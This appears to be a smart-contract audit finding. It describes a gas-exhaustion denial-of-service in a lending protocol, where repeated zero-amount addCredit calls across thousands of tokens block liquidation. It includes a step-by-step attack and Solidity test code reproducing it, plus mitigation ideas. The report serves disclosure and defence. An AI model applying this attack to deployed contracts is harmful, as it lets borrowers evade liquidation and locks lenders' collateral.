# Vulnerability details

## Impact
A borrower can avoid being liquidated if they call repeatedly function addCredit with multiple tokens.

## POC
We must consider that:
* [Current block gas limit of 30.000.000](https://ycharts.com/indicators/ethereum_average_gas_limit#:~:text=Ethereum%20Average%20Gas%20Limit%20is,0.01%25%20from%20one%20year%20ago.)
* We suppose that the oracle works ok, but it manages lots of tokens. Then we can assume that an scenario with 3000 tokens' prices feeded by the oracle is possible

The attack will consist in:
1. The borrower create an account EVIL_ACC
1. EVIL_ACC calls ```addCredit(0,0,0,token,EVIL_ACC)``` from a line of credit
1. borrower calls ```addCredit(0,0,0,token,EVIL_ACC)``` from a line of credit
1. Repeat step 2 and 3 3000 times with the different token' prices feeded by the oracle

Doing this while provoke DOS of functions: ```accrueInterest``` and ```updateOutstandingDebt``` in contract ```LineOfCredit```.

```accrueInterest``` seems to produce no harm to any of the contracts presented, however ```updateOutstandingDebt``` yes. This last function is called by function ```EscrowLib._getLatestCollateralRatio```.

Function ```_getLatestCollateralRatio``` is used in functions ```addCollateral```, ```releaseCollateral```, ```getCollateralRatio``` and ```isLiquidatable``` EscrowLine._healthcheck

This will produces a DOS to functions:
* ```Escrow.addCollateral``` and ```Escrow.releaseCollateral```: Meaning that the borrower won't be able to add or remove their collateral
* ```Escrow.getCollateralRatio```
* ```Escrow.isLiquidatable```
* ```EscrowLine._healthcheck```: This function plays an important role in function```SecuredLine._healthcheck```. In consequence, function ```SecuredLine.liquidate``` will always be reverted due to lack of gas. Meaning that the arbitrer won't be able to liquidate the positon

This will lock collateral forever, and the protocol can not assure this won't happen.

Consider next tests added to file ```LineOfCredit.t.sol``` to check if this vector attack can be completely mitigated

```solidity
function setUpIdDOS(uint tokenAmountToProvokeDOS) internal{
    // Suppose next account is in control of borrower
    address randomLenderManagedByBorrower= address(30);

    // Now borrower create multiple ERC20 tokens and decide to open a credit line for each token
    // The borrower take advantage of multiple ERC20 tokens added to the oracle and decide to add credit for each of these tokens to themselves.
    // Note: Here the tokens are created, but just for testing. The assumption is that these token are already registered by the oracle
    for (uint i; i < tokenAmountToProvokeDOS; ++i){
        // Take into account that we do not need to send tokens, they only need to be available in the oracle
        RevenueToken borrowerRandomToken = new RevenueToken();
        oracle.changePrice(address(borrowerRandomToken),1);

        // The controled lender add 0 credit
        vm.prank(randomLenderManagedByBorrower);
        bytes32 id = line.addCredit(dRate, fRate, 0, address(borrowerRandomToken), randomLenderManagedByBorrower);

        //The borrower confirms the credit addition
        vm.prank(borrower);
        id = line.addCredit(dRate, fRate, 0, address(borrowerRandomToken), randomLenderManagedByBorrower);
    }
}

function test_accrue_interest_DOS() public{
    uint gasLimit = 30000000;
    setUpIdDOS(3000);
    vm.prank(borrower);
    line.accrueInterest{gas: gasLimit}();
}


function test_updateOutstandingDebt_DOS() public{
    uint gasLimit = 30000000;
    setUpIdDOS(2500);
    vm.prank(borrower);
    line.updateOutstandingDebt{gas: gasLimit}();
}
```

## Mitigation steps
This is a tough one. I would suggest:
* Consider a token limit to add to the oracle, but if block gas limit is reduced, this would not make much.
* Consider that amount should be greater than zero when ```addCredit``` is called, this will make the attack more expensive.
* Consider to refactor function ```updateOutstandingDebt```

